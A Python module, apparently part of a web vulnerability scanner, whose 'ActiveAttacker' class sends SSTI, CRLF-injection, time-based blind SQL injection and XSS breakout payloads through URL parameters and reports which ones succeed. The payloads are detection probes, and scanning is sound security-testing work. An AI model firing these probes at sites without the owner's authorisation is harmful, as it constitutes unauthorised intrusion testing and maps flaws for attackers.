import requests
import time
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
from config import SSTI_PAYLOADS, CRLF_PAYLOADS, TIME_BASED_SQLI

EXPANDED_SSTI = {
    "Jinja2/Twig": ("{{7*7}}", "49"),
    "Spring/Mako": ("${7*7}", "49"),
    "ERB/Ruby": ("<%= 7*7 %>", "49"),
    "Smarty": ("{7*7}", "49")
}

EXPANDED_TIME_SQLI = {
    "MySQL": "SLEEP(3)",
    "PostgreSQL": "pg_sleep(3)",
    "MSSQL": "WAITFOR DELAY '0:0:3'",
    "SQLite": "like('ABCDEFG',upper(hex(randomblob(30000000/2))))",
    "Oracle": "dbms_pipe.receive_message(('a'),3)"
}

ADVANCED_XSS_PAYLOADS = [
    "<script>console.log('XSS-Test')</script>",
    '"><script>alert(1)</script>',
    '"><img src=x onerror=alert(1)>',
    '" autofocus onfocus=alert(1) x="',
    "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>"
]

class ActiveAttacker:
    def __init__(self, session):
        self.session = session

    # --- Feature 1: SSTI Scanner ---
    def check_ssti(self, base_url):
        """
        Fuzzes URL parameters with template math (e.g., {{7*7}}).
        If the response contains '49', SSTI is likely present.
        """
        issues = []
        parsed = urlparse(base_url)
        params = dict(parse_qsl(parsed.query))
        
        if not params:
            # Test default query params if none exist
            params = {'q': 'test', 'name': 'test', 'template': 'test'}

        for key in list(params.keys())[:3]:
            for engine, (payload, expected_result) in EXPANDED_SSTI.items():
                fuzzed = params.copy()
                fuzzed[key] = payload
                
                query = urlencode(fuzzed)
                target = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, query, parsed.fragment))
                
                try:
                    resp = self.session.get(target, timeout=2.0)
                    if expected_result in resp.text and payload not in resp.text:
                        issues.append(f"SSTI ({engine}) confirmed in param '{key}': '{payload}' evaluated to '{expected_result}'")
                        break
                except Exception:
                    pass
        return issues

    # --- Feature 2: CRLF Injection ---
    def check_crlf(self, base_url):
        """
        Attempts to inject a Set-Cookie header via the URL path.
        """
        issues = []
        base_clean = base_url.rstrip('/')
        
        for payload in CRLF_PAYLOADS:
            target = f"{base_clean}{payload}"
            try:
                resp = self.session.get(target, timeout=2)
                cookies = resp.headers.get('Set-Cookie', '')
                if 'crlf=injection' in cookies:
                    issues.append(f"CRLF Injection successful: Server accepted fake Set-Cookie header.")
                    break
            except Exception:
                pass
        return issues

    # --- Feature 3: Time-Based Blind SQLi ---
    def check_time_based_sqli(self, base_url):
        """
        Injects SLEEP commands and measures response time across multiple SQL dialects.
        """
        issues = []
        parsed = urlparse(base_url)
        params = dict(parse_qsl(parsed.query))
        
        if not params: 
            params = {'id': '1', 'cat': '1', 'page': '1'}

        for key in list(params.keys())[:2]:
            for db_type, payload in EXPANDED_TIME_SQLI.items():
                fuzzed = params.copy()
                fuzzed[key] = f"{params[key]} AND {payload}"
                
                query = urlencode(fuzzed)
                target = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, query, parsed.fragment))
                
                try:
                    start_time = time.time()
                    self.session.get(target, timeout=4)
                    end_time = time.time()
                    
                    duration = end_time - start_time
                    
                    if duration > 2.8:
                        issues.append(f"Time-Based SQLi ({db_type}) in param '{key}': Response delayed by {round(duration, 2)}s")
                        break
                except requests.exceptions.ReadTimeout:
                    issues.append(f"Time-Based SQLi ({db_type}) in param '{key}': Request timed out (Potential Sleep).")
                    break
                except Exception:
                    pass
        return issues

    # --- Feature 4: Context-Aware Advanced XSS Fuzzing ---
    def check_advanced_xss(self, base_url, crawled_links=None):
        """
        Fuzzes URL parameters with polyglot and breakout XSS payloads.
        """
        findings = []
        targets = [base_url]
        if crawled_links:
            targets.extend(crawled_links[:5])

        for target in targets:
            parsed = urlparse(target)
            params = dict(parse_qsl(parsed.query))
            if not params:
                params = {'q': 'test', 'search': 'test', 'query': 'test'}

            for param in list(params.keys())[:2]:
                for payload in ADVANCED_XSS_PAYLOADS:
                    fuzzed = params.copy()
                    fuzzed[param] = payload
                    query = urlencode(fuzzed)
                    test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, query, parsed.fragment))

                    try:
                        resp = self.session.get(test_url, timeout=2.0)
                        if payload in resp.text:
                            findings.append(f"Unsanitized Reflection / XSS Vector on '{param}': Reflected breakout payload: {payload[:35]}...")
                            break
                    except Exception:
                        continue
                if findings:
                    break

        return findings
